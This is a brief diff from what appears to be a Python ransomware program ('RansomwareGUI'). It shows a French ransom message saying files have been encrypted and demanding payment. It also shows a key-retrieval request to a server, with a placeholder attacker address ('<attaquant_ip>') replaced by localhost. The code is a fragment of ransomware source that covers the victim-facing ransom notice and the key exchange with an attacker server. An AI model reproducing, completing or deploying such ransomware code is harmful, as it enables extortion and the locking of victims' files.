@@ -21,7 +21,7 @@ class RansomwareGUI:
         messagebox.showinfo("Ransomware", "Vos fichiers ont été chiffrés. Payez la rançon pour les déchiffrer.")
 
     def request_private_key(self):
-        response = requests.post('http://<attaquant_ip>:5000/get_private_key', json={'paid': True})
+        response = requests.post('http://127.0.0.1:5000/get_private_key', json={'paid': True})
         if response.status_code == 200:
             private_key_pem = response.json()['private_key']
             private_key = serialization.load_pem_private_key(
